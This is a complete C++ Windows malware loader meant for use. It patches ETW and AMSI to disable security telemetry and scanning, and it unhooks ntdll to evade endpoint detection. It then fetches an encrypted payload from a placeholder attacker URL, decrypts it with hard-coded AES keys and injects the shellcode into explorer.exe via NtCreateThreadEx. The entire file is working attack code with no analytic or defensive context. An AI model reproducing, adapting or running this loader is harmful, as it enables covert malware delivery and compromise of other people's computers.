#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <wincrypt.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")

// === AES Key and IV ===
BYTE key[] = { 0x2c, 0xaa, 0xe1, 0x1f, 0x40, 0x19, 0x1b, 0xf5, 0x70, 0x16, 0x2c, 0x53, 0xee, 0x61, 0xad, 0x6b, 0x54, 0xc1, 0x7d, 0xfe, 0x5d, 0x18, 0x24, 0x73, 0x53, 0xa8, 0x0e, 0xa2, 0x8c, 0x11, 0x7b, 0xa4 };
BYTE iv[] = { 0x8a, 0x0d, 0x0e, 0x01, 0x12, 0x9d, 0x08, 0x61, 0x44, 0xd5, 0xa8, 0x5a, 0xb2, 0x29, 0x18, 0x9e };

// === ETW Bypass ===
bool PatchETW() {
    void* pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    DWORD oldProtect;
    BYTE patch[] = { 0xC3 };  // ret
    if (VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    return false;
}

// === AMSI Bypass ===
bool PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return false;
    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;
    DWORD oldProtect;
    BYTE patch[] = { 0xC3 };  // ret
    if (VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    return false;
}

// === Unhook NTDLL ===
bool UnhookNtdll() {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD size = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[size];
    DWORD bytesRead;
    ReadFile(hFile, buffer, size, &bytesRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    BYTE* textData = nullptr;
    DWORD textSize = 0, textVA = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (strncmp((char*)sec->Name, ".text", 5) == 0) {
            textData = buffer + sec->PointerToRawData;
            textSize = sec->SizeOfRawData;
            textVA = sec->VirtualAddress;
            break;
        }
    }

    if (!textData || !textSize) {
        delete[] buffer;
        return false;
    }

    HMODULE ntdllBase = GetModuleHandleW(L"ntdll.dll");
    BYTE* inMemoryText = (BYTE*)ntdllBase + textVA;
    DWORD oldProtect;
    VirtualProtect(inMemoryText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(inMemoryText, textData, textSize);
    VirtualProtect(inMemoryText, textSize, oldProtect, &oldProtect);

    delete[] buffer;
    return true;
}

// === Find explorer.exe PID ===
DWORD FindExplorerPID() {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, L"explorer.exe") == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

// === Download encrypted payload ===
BYTE* DownloadPayload(const char* url, DWORD& outSize) {
    HINTERNET hInternet = InternetOpenA("LoaderAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return nullptr;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return nullptr;
    }

    std::vector<BYTE> data;
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    outSize = static_cast<DWORD>(data.size());
    BYTE* result = new BYTE[outSize];
    memcpy(result, data.data(), outSize);
    return result;
}

// === Stealthy Injection via NtCreateThreadEx ===
typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, LPVOID, HANDLE,
    LPTHREAD_START_ROUTINE, LPVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, LPVOID
    );

bool InjectToExplorer(BYTE* shellcode, SIZE_T shellcodeSize) {
    DWORD pid = FindExplorerPID();
    if (!pid) return false;

    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return false;

    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcodeSize, NULL)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (LPTHREAD_START_ROUTINE)remoteAddr, NULL, FALSE,
        0, 0, 0, NULL);

    if (!NT_SUCCESS(status) || !hThread) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// === Entry Point ===
int main() {
    UnhookNtdll();
    PatchETW();
    PatchAMSI();
    

    DWORD payloadSize = 0;
    BYTE* encrypted = DownloadPayload("http://YOURip/payload.enc", payloadSize);
    if (!encrypted || payloadSize == 0) {
        std::cerr << "[-] Failed to download payload." << std::endl;
        return -1;
    }

    BYTE* shellcode = new BYTE[payloadSize];
    memcpy(shellcode, encrypted, payloadSize);
    delete[] encrypted;

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    struct {
        BLOBHEADER hdr;
        DWORD keySize;
        BYTE keyData[32];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = 32;
    memcpy(keyBlob.keyData, key, 32);

    DWORD outSize = payloadSize;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
        !CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey) ||
        !CryptSetKeyParam(hKey, KP_IV, iv, 0) ||
        !CryptDecrypt(hKey, 0, TRUE, 0, shellcode, &outSize)) {
        DWORD err = GetLastError();
        std::cerr << "[-] AES decryption failed" << std::hex << err << std::endl;
        return -1;
    }

    std::cout << "[*] Injecting to explorer.exe..." << std::endl;
    if (!InjectToExplorer(shellcode, outSize)) {
        std::cerr << "[-] Injection failed." << std::endl;
        return -1;
    }

    std::cout << "[+] Shellcode injected successfully." << std::endl;
    delete[] shellcode;
    return 0;
}
